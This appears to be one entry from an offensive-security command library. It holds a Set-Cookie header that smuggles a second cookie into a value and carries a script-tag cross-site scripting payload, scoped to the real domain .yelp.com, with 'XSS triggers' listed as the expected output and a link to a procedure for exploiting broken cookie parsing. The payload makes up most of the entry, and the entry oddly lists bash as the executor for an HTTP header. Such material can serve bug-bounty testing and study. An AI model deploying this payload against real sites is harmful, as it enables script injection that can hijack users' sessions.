---
data: >-
  Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>;
  Domain=.yelp.com; Path=/; Secure;
tags:
  - cookie-smuggling
type: command
executor: bash
platforms:
  - Web
id: fee84ba6-188c-4bcc-9c5f-bd1e0af5b110
created_at: '2025-12-13T23:56:20.364Z'
updated_at: '2025-12-13T23:56:20.364Z'
verified: false
validated: true
submitted: true
---
# set-smuggled-cookie-response

## Command

```bash
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure;
```

## Description

Sets smuggled cookie in response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `yelpmainpaastacanary` | Smuggled value | Yes |

## Examples

### Basic Usage

```bash
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure;
```

## Expected Output

Cookie set, XSS triggers

## Related

- [[procedures/Exploit-Broken-Cookie-Parsing-for-Smuggling]]
